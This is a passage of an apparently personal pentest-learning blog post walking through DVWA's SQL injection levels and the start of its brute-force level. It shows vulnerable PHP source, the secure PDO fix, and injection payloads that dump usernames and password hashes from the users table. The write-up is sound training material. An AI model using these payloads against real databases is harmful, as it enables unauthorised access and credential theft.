class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="variable">$number_of_rows</span> = mysqli_fetch_row( <span class="variable">$result</span> )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>In line 7, mysql_real_escape_string() will escape special characters in a string. In line 9, userid=$id tell us this is a digital error injection.Let’s try it.</p>
+<h4 id="Injection-1"><a href="#Injection-1" class="headerlink" title="Injection"></a>Injection</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">-1</span>&#x27; <span class="keyword">or</span> <span class="number">89</span>=<span class="number">89</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gphuzijsufj31oo0pm45v.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gphuzijsufj31oo0pm45v.jpg" alt="image-20210413092739075"></a></p>
+<p>Looks like it has some basic hack-detecting technology</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="symbol">1 </span><span class="keyword">or</span> <span class="number">1</span> like <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>Bying trying kinds of sqli-bypass, finally I get the normal page.</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="symbol">1 </span>order by <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>There’s 2 columns in current form, and also can make 2 point display information.</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gphw6jjplij31vy0t27de.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gphw6jjplij31vy0t27de.jpg" alt="image-20210413100859744"></a></p>
+<p>Send the same payload as Low to get password</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="symbol">1 </span>UNION SELECT database(),group_concat(user,password) from dvwa.users</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpic54c57ej31ou0cigom.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpic54c57ej31ou0cigom.jpg" alt="image-20210413192112825"></a></p>
+<hr>
+<h3 id="Difficulty-Medium-1"><a href="#Difficulty-Medium-1" class="headerlink" title="Difficulty: Medium"></a>Difficulty: Medium</h3><h4 id="Code-audit-1"><a href="#Code-audit-1" class="headerlink" title="Code audit"></a>Code audit</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span> [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>As we see, they did a restrictions on the tail of query queue, LIMIT 1,but we can just comment them to</p>
+<p>In this page, they add a pop-up window for us to input the parameter.</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpiao0ndc8j31820u0aft.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpiao0ndc8j31820u0aft.jpg" alt="image-20210413183007994"></a></p>
+<p>By capturing the POST package, we can modify the ID parameter.But there’s a new problem is that the pop-up window would not show us the result of query but the original window does.</p>
+<p>So the solution is to input payload on pop-up page and watch the result on original page to judge whether the injection is succeed.</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1&#x27; union <span class="keyword">select</span> <span class="keyword">database</span>(),group_concat(<span class="keyword">user</span>,<span class="keyword">password</span>) <span class="keyword">from</span> dvwa.users #</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpibwsw30fj31cg0mwn67.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpibwsw30fj31cg0mwn67.jpg" alt="image-20210413191312649"></a></p>
+<hr>
+<h3 id="Difficulty-Impassible"><a href="#Difficulty-Impassible" class="headerlink" title="Difficulty: Impassible"></a>Difficulty: Impassible</h3><h4 id="Code-audit-2"><a href="#Code-audit-2" class="headerlink" title="Code audit"></a>Code audit</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Joined the token authentication mechanism. Check if the user’s input is a number.Using PDO technology to separated input and data.</p>
+<hr>
+<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><h3 id="Difficulty-Low-1"><a href="#Difficulty-Low-1" class="headerlink" title="Difficulty: Low"></a>Difficulty: Low</h3><p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpj3qukc0wj30so0qgjug.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpj3qukc0wj30so0qgjug.jpg" alt="image-20210414111616071"></a></p>
+<p>Just cracking credentials in burp suite. Nothing more to say.</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpj401jxndj316w0ecdil.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpj401jxndj316w0ecdil.jpg" alt="image-20210414112506178"></a></p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpj3zn018kj30js0i4tb1.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpj3zn018kj30js0i4tb1.jpg" alt="image-20210414112443376"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Difficulty-Medium-2"><a href="#Difficulty-Medium-2" class="headerlink" title="Difficulty: Medium"></a>Difficulty: Medium</h3><p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/008eGmZEly1gpj44dhpicj314u0faq5v.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpj44dhpicj314u0faq5v.jpg" alt="image-20210414112916367"></a></p>
+<p>The speed of cracking is very low, maybe we should check the source code.</p>
+<p>To be continue…</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pentest-Learning/" rel="tag"># Pentest-Learning</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/11/04/%E6%9F%90APP%E7%9A%84%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" rel="prev" title="某APP的安全测试">
+                  <i class="fa fa-chevron-left"></i> 某APP的安全测试
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/11/04/proxychains%E4%BB%A3%E7%90%86/" rel="next" title="proxychains代理">
+                  proxychains代理 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Fre4k5en</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
